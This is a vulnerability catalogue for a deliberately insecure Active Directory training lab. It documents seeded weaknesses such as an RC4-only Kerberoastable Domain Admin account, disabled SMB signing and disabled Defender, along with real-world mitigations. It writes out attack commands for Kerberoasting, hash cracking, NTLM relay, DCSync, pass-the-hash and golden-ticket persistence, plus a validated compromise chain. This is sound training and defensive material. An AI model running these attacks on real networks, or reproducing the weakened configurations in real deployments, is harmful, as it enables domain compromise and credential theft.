# Vulnerability catalogue — MARVEL.local

Every weakness in this lab is **deliberate** and baked in by the Ansible roles, so a fresh
`./deploy-azure.sh` (or `vagrant up`) produces an attack-ready domain with no manual patching.
This file is the single reference for *what* is weak, *where* it is configured, the *intended
attack*, and the *real-world mitigation*.

Passwords here are public (they're in the TCM PEH/PNPT course and in this repo). **Never reuse
them anywhere real, and never expose this lab beyond your tailnet / your own `/32`** — see
[security-model.md](security-model.md).

## Hosts & accounts

| Host | Role | OS |
|---|---|---|
| HYDRA-DC (10.0.2.10) | Domain Controller + AD CS (Enterprise Root CA) | Windows Server 2022 |
| THEPUNISHER (10.0.2.11) | Domain-joined workstation | Windows 11 24H2 Pro |
| SPIDERMAN (10.0.2.12) | Domain-joined workstation | Windows 11 24H2 Pro |

| User | Password | Privilege | Notes |
|---|---|---|---|
| tstark | `P@$$w0rd` | **Domain Admin** | the "stolen" DA |
| SQL_Service | `MYpassword123#` | **Domain Admin** + SPN | Kerberoast target (see V1) |
| fcastle | `Password1` | **Local admin** on both workstations | relay / psexec path |
| pparker | `Password2` | standard user | foothold user |

All four have **password-never-expires** set.

---

## V1 — Kerberoastable service account, RC4-forced, over-privileged, creds in Description

**The headline finding, and the one that used to need manual patching every deploy.**

Configured in [`group_vars/all.yml`](../ansible/group_vars/all.yml) (the `SQL_Service` entry +
`spn:`) and applied by the `domain_controller` role's *"Create domain users"* task. Four separate
misconfigurations stack on one account:

| Sub-finding | How it's set | Where |
|---|---|---|
| a. Has an SPN (`HYDRA-DC/SQL_Service.MARVEL.local:60111`) | `spn.value`, applied via the module's `spn: {add: [...]}` | group_vars + DC role |
| b. **Is a Domain Admin** | `domain_admin: true` → added to Domain/Enterprise/Schema Admins + GPCO | group_vars + DC role group task |
| c. Password in the AD **Description** | `description: "The password is MYpassword123#"` | group_vars |
| d. **`msDS-SupportedEncryptionTypes = 4` (RC4 only)** | `supported_enc_types: 4` → written via the module's `attributes: {set: ...}` | group_vars + DC role |

### Why (d) is the key gap
On **Windows Server 2022** the KDC prefers AES. If `msDS-SupportedEncryptionTypes` is left
unset/AES-capable, `GetUserSPNs -request` either returns an **AES** ticket (`$krb5tgs$18$`, far
slower to crack and not what the course expects) or the KDC rejects the request with
**`KDC_ERR_ETYPE_NOSUPP`**. Forcing the account to advertise **RC4 only (value `4`)** makes the
KDC issue an **RC4 (etype 23)** service ticket, so the roast comes back as a crackable
`$krb5tgs$23$…` hash. This is now baked in — no post-deploy `Set-ADUser` needed.

### Intended attack
```bash
# Any domain user can request service tickets for accounts with an SPN:
impacket-GetUserSPNs 'MARVEL.local/fcastle:Password1' -dc-ip 10.0.2.10 -request
# -> $krb5tgs$23$*SQL_Service$MARVEL.LOCAL$...   (etype 23 = RC4)
hashcat -m 13100 sqlservice.hash /usr/share/wordlists/rockyou.txt
# -> MYpassword123#   ... which is also literally in the account's Description,
#    and the account is a Domain Admin -> full domain compromise.
```

### Real-world mitigation
- Use **Group Managed Service Accounts (gMSA)** — 120-char randomly-rotated passwords that can't
  be cracked offline — instead of a static-password service account with an SPN.
- **Never** place a service account in Domain Admins; grant only the specific rights it needs.
- **Remove RC4**: leave `msDS-SupportedEncryptionTypes` at AES-only (`0x18`) domain-wide; RC4 roasts
  become impractical. Monitor Event ID 4769 for RC4 ticket requests.
- Never store secrets in the `description` / `info` attributes — they're readable by any
  authenticated user.

---

## V2 — Domain Admin with a weak, static password (tstark)

`tstark` is a Domain Admin (`domain_admin: true`) with the guessable password `P@$$w0rd` and no
expiry. In the course he's created by *copying* the built-in Administrator, so he inherits
Domain/Enterprise/Schema Admins + Group Policy Creator Owners (the `domain_admin_groups` set).

- **Intended attack:** password spray / the cracked SQL_Service creds pivot to DA; DCSync,
  Golden Ticket, lateral movement anywhere.
- **Mitigation:** enforce long unique passwords + MFA for privileged accounts; use the
  **Protected Users** group and tiered admin (PAW); keep Domain Admins near-empty and off member
  workstations; monitor for DCSync (4662 / replication from non-DCs).

---

## V3 — Over-privileged local admin on workstations (fcastle)

`fcastle` is a **local Administrator on both THEPUNISHER and SPIDERMAN** (`local_admins` in
group_vars, applied by the `domain_member` role). Enables the classic psexec / relay path.

- **Intended attack:** `nxc smb <ws> -u fcastle -p Password1` → **`(Pwn3d!)`**; dump SAM/LSA,
  harvest cached DA tokens, `impacket-psexec` for SYSTEM.
- **Mitigation:** **LAPS** (unique, rotated per-machine local admin passwords); keep domain users
  out of local Administrators; enable **Credential Guard** so cached creds/tokens can't be
  harvested; deny network logon for local admins.

---

## V4 — SMB signing not required on the workstations

The `domain_member` role sets `RequireSecuritySignature = $false` (server **and** client) when
`disable_smb_signing: true`. This exposes workstations to **NTLM relay**.

> **Build-26100 caveat (fixed in this role):** Windows 11 24H2 / Server 2025 require inbound SMB
> signing *by default*, and the on-the-wire "signing required" flag only clears when the **Server
> (LanmanServer) service restarts**. Setting the config alone leaves `nxc` still reporting
> `signing:True`. The role now **bounces LanmanServer** whenever it changes the setting, so a
> fresh deploy comes up with signing genuinely not-required. (An *already-running* lab from before
> this fix needs the workstations redeployed, or a reboot, to apply it — see the re-deploy note in
> the handoff.)

- **Intended attack:** poison name resolution (LLMNR/NBNS — left on via `disable_llmnr: false`) to
  coerce auth, then `impacket-ntlmrelayx -t smb://<workstation>` to relay to an unsigned SMB
  target and execute as the relayed user. Verify the target is relayable: `nxc` shows
  `signing:False`.
- **Mitigation:** **require SMB signing** everywhere (the 24H2/Server 2025 default — leave it on);
  disable LLMNR/NBT-NS and mDNS; enable **Extended Protection for Authentication (EPA)** /
  channel binding; segment the network.

---

## V5 — Host defences disabled (Defender + firewall) on all hosts

When `disable_defender`/`disable_firewall` are true:
- **DC:** a domain-linked **"Disable Windows Defender" GPO** (`DisableAntiSpyware` +
  `DisableRealtimeMonitoring`), plus a local `Set-MpPreference -DisableRealtimeMonitoring` and the
  **firewall turned off** on the DC itself (added so the DC matches "all hosts", not just the
  workstations).
- **Workstations:** real-time protection off + all firewall profiles off.

- **Intended attack:** payloads/tools (mimikatz, psexec, Rubeus) run and land on disk without AV
  interference; SMB/RPC/WinRM reachable with no host-firewall filtering.
- **Mitigation:** keep **Defender + Tamper Protection** on with cloud-delivered protection and
  ASR rules; keep the **host firewall on** with least-privilege inbound rules; alert on AV/firewall
  being disabled (it's a high-fidelity attacker TTP).

---

## V6 — `hackme` SMB share + AD CS present

- **Open share:** `\\HYDRA-DC\hackme` (`C:\Shares\hackme`, `full: Everyone`) — anonymous-ish,
  world-accessible share for enumeration/loot. Role: *"Create the SMB share"*.
- **AD CS:** an **Enterprise Root CA** (`MARVEL-HYDRA-DC-CA`) is installed. Its mere presence is
  the groundwork for the ESC attack family.

- **Intended attack:** `nxc smb 10.0.2.10 -u fcastle -p Password1 --shares` to find `hackme`;
  enumerate loot. For AD CS, run **Certify/Certipy** (`certipy find`) to hunt ESC1-ESC8
  misconfigured templates and NTLM-relay-to-HTTP-enrolment (ESC8).
- **Mitigation:** lock down share ACLs (no `Everyone`, enable access-based enumeration + signing);
  for AD CS, audit templates with Certipy, remove `ENROLLEE_SUPPLIES_SUBJECT` + dangerous EKUs,
  restrict enrolment rights, enable EPA on the CA web-enrolment endpoints, and monitor
  certificate issuance.

---

## Quick read-only verification (from Kali on the tailnet)

```bash
# V1 — RC4 Kerberoast returns a crackable $krb5tgs$23$ ticket:
impacket-GetUserSPNs 'MARVEL.local/tstark:P@$$w0rd' -dc-ip 10.0.2.10 -request | grep '\$krb5tgs\$23\$'

# V3/V4 — fcastle Pwn3d! and signing flag on the workstations:
nxc smb 10.0.2.11 10.0.2.12 -u fcastle -p 'Password1' -d MARVEL.local
#   expect: (Pwn3d!) on each, and (signing:False) after the V4 fix is deployed

# V6 — the hackme share is visible:
nxc smb 10.0.2.10 -u fcastle -p 'Password1' -d MARVEL.local --shares | grep -i hackme
```

---

## Validated end-to-end — full compromise chain (2026-11-25)

The intended path was run against the deployed lab and works out of the box. This is the chain
the weaknesses above are meant to produce, start to finish:

```text
1. Kerberoast (V1):   GetUserSPNs -request  ->  $krb5tgs$23$ (RC4) ticket for SQL_Service
2. Crack offline:     hashcat -m 13100      ->  SQL_Service : MYpassword123#
                      (same value is also literally in the account's AD Description)
3. Privilege (V1b):   SQL_Service is a Domain Admin  ->  replication (DCSync) rights
4. DCSync the DIT:    impacket-secretsdump MARVEL.local/SQL_Service:'MYpassword123#'@10.0.2.10
                      -> uses the DRSUAPI method to pull every NTDS.DIT secret
5. Crack NTLM (V2):   hashcat -m 1000 ntds_hashes.txt rockyou.txt
```

**Step 4 succeeding is itself the proof the V1b fix is live** — `secretsdump` only reaches the
`[*] Using the DRSUAPI method to get NTDS.DIT secrets` stage because `SQL_Service` now holds
Domain Admin / replication rights. Before the fix it was a standard user and DCSync was refused.

**Step 5 result** — rockyou recovered the four seeded domain users straight from the NTDS dump:

| Account | Recovered password | Note |
|---|---|---|
| `tstark` | `P@$$w0rd` | Domain Admin — full domain owned |
| `SQL_Service` | `MYpassword123#` | Domain Admin (the roasted account) |
| `fcastle` | `Password1` | local admin on both workstations |
| `pparker` | `Password2` | standard user |

The strong-random accounts (`azureadmin`, `krbtgt`, the machine accounts) correctly resist
rockyou — only the deliberately-weak seeded passwords fall, exactly as designed.

> **Why the raw dumps aren't pasted here.** The full `secretsdump` output contains *real*
> operational secrets for the running deployment — the `krbtgt` hash (golden-ticket material),
> the `azureadmin` NT hash (pass-the-hash to the live VMs), machine-account hashes, LSA secrets
> and DPAPI keys. Those must **never** be committed to the repo (see
> [security-model.md](security-model.md) and `make audit`). Keep any raw loot in a local,
> git-ignored `marvel-loot/` directory on the attacker box — not in version control. The seeded
> user passwords shown above are already public by design, so they're safe to document.

### Post-DCSync: persistence & lateral movement

Once the NTDS secrets are out, the dump enables the standard follow-on techniques. Commands use
**placeholders** — fill them from your local, git-ignored loot file, never from this repo.

```bash
# Pass-the-Hash as RID-500 / tstark (Domain Admin) — no password needed (T1550.002):
nxc smb 10.0.2.10 -u tstark -H <tstark_nt_hash>
impacket-psexec -hashes :<azureadmin_nt_hash> azureadmin@10.0.2.10   # SYSTEM on the DC

# Golden Ticket for domain persistence, forged from the krbtgt key (T1558.001):
#   use <krbtgt_nt_hash> (or its AES256 key) with the domain SID -> ticketer.py / Rubeus
```

| Stage | MITRE ATT&CK |
|---|---|
| DCSync via SQL_Service | **T1003.006** — OS Credential Dumping: DCSync |
| Pass-the-Hash (azureadmin / tstark) | **T1550.002** — Use Alternate Auth Material: PtH |
| Golden Ticket (krbtgt) | **T1558.001** — Steal/Forge Kerberos Tickets: Golden Ticket |

**Remediation (the real-world fixes these map to):** least-privilege service accounts with **no
Domain Admin** and **gMSAs** instead of static passwords; **AES-only** Kerberos (no RC4); tiered
admin / Protected Users so DA hashes never cache on workstations; and — after any DC compromise —
a **double krbtgt reset** to invalidate forged Golden Tickets.

> **Note for this lab:** because the real `krbtgt` and `azureadmin` secrets have now appeared in
> screenshots and pasted text, they should be considered disclosed. That's harmless for a
> throwaway practice lab, but if you ever want it clean again, a fresh `./destroy-azure.sh &&
> ./deploy-azure.sh` rotates every one of them.

